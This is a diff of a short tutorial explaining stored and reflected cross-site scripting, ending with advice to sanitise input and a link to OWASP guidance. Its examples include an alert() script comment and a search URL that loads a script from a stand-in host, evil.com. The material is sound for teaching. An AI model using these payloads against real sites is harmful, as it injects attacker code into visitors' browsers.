@@ -10,7 +10,6 @@ For example, a hacker could leave the following comment on a vulnerable site:
 
 ```
 <script>alert('Your site was hacked!');</script>
-
 ```
 
 When the site displays the comments, it also serves the hacker's malicious code:
@@ -24,7 +23,6 @@ When the site displays the comments, it also serves the hacker's malicious code:
  CleverHacker said:
  <script>alert('Your site was hacked!');</script>
 </div>
-
 ```
 
 In the example above, all sites visitors would see a popup that says "Your site was hacked". Far more potent attacks have been used to deface important websites.
@@ -35,7 +33,6 @@ The following example shows how a non-persistent XSS attack is performed. In thi
 
 ```
 http://news.org/search/?q=<script src='evil.com/hack.js'></script>
-
 ```
 
 Since the page displays the search query, the `<script>` tag will be executed and the malicious JavaScript file will be loaded:
@@ -44,7 +41,6 @@ Since the page displays the search query, the `<script>` tag will be executed an
 <h1>
  Showing results for query <script src='evil.com/hack.js'></script>
 </h1>
-
 ```
 
 XSS injection can be preventing by properly sanitizing any user-provided data. OWASP has [an excellent guide](https://www.owasp.org/index.php/XSS_%28Cross_Site_Scripting%29_Prevention_Cheat_Sheet) on securing your applications against XSS.
